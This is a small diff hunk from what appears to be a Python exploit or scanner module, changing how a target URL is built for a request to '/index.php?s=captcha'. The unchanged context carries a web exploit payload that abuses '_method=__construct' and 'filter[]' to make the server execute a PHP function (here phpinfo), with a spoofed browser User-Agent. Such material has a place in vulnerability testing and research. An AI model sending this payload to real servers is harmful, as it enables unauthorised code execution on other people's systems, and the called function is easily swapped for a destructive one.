@@ -16,7 +16,7 @@ def run(url, timeout):
         'attack': True,
     }
     try:
-        target = urllib.parse.urljoin(url, '/index.php?s=captcha')
+        target = url + '/index.php?s=captcha'
         payload = r'_method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1'
         headers = {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0',
